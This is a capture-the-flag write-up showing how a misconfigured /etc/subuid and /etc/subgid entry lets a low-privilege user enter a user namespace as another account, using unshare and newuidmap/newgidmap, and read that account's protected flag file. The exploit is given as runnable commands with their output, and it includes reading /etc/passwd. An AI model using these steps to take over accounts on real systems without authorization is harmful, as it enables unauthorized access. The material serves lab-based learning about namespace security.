# subuser write-up

## connect through ssh with simpleuser account

## identify there are two interesting users on the machine.

```
$ cat /etc/passwd | tail -2
simpleuser:x:1000:1000::/home/simpleuser:/bin/bash
flaguser:x:1001:1001::/home/flaguser:/bin/bash
```

One user is called `flaguser`. Its uid and gid are 1001/1001.

## notice vulnerable subuid and subgid configuration

```
[simpleuser@6304f11c4fca ~]$ cat /etc/subuid
simpleuser:524288:65536
flaguser:589824:65536
simpleuser:1001:1
[simpleuser@6304f11c4fca ~]$ cat /etc/subgid
simpleuser:524288:65536
flaguser:589824:65536
simpleuser:1001:1
```

Lines `simpleuser:1001:1` mean that simpleuser can create a new user namespace, and map uid/gid inside the user namespace to uid/gid 1001 outside the namespace, corresponding to flaguser uid/gid.

## use unshare to create a new user namespace and display PID

```
[simpleuser@6304f11c4fca ~]$ PS1='€ ' unshare -U bash
€ echo $$
46
€ 
```

## open another session through ssh with simpleuser account, and change uid and gid mapping allowed by vulnerable subuid and subgid mapping

```
[simpleuser@6304f11c4fca ~]$ newuidmap 
usage: newuidmap [<pid>|fd:<pidfd>] <uid> <loweruid> <count> [ <uid> <loweruid> <count> ] ... 
[simpleuser@6304f11c4fca ~]$ newuidmap 46 0 1000 1 1 1001 1
[simpleuser@6304f11c4fca ~]$ newgidmap 46 0 1000 1 1 1001 1
```

These commands will map, for user namespace of PID 46, uid/gid 0 inside the namespace to 1000 outside, and uid/gid 1 inside the namespace to 1001 outside.

## on previous session, search and display flag

```
€ ls -al /home/
total 0
drwxr-xr-x. 1 nobody nobody 16 Sep 16 12:03 .
dr-xr-xr-x. 1 nobody nobody 12 Sep 16 12:03 ..
drwx------. 1 bin    bin    18 Sep 16 12:03 flaguser
drwx------. 1 root   root   64 Sep 16 12:03 simpleuser
€ ls -al /home/flaguser/
total 16
drwx------. 1 bin    bin     18 Sep 16 12:03 .
drwxr-xr-x. 1 nobody nobody  16 Sep 16 12:03 ..
-rw-r--r--. 1 bin    bin     18 Feb  6  2023 .bash_logout
-rw-r--r--. 1 bin    bin    141 Feb  6  2023 .bash_profile
-rw-r--r--. 1 bin    bin    492 Feb  6  2023 .bashrc
-r--------. 1 bin    bin     33 Sep 16 11:57 .flag.txt
€ cat /home/flaguser/.flag.txt
Congrats, here is the flag: FLAG
€ 
```

Notice that the user/group simpleuser (uid/gid 1000) and flaguser (uid/gid 1001) appears as root (uid/gid 0) and bin (uid/gid 1) when inside the user namespace.

# sources

- https://man7.org/linux/man-pages/man7/user_namespaces.7.html
- https://blog.quarkslab.com/digging-into-linux-namespaces-part-2.html
- https://www.redhat.com/sysadmin/podman-inside-container
- https://github.com/containers/podman/blob/main/contrib/podmanimage/stable/Containerfile
- https://github.com/containers/podman/blob/main/docs/tutorials/rootless_tutorial.md#etcsubuid-and-etcsubgid-configuration
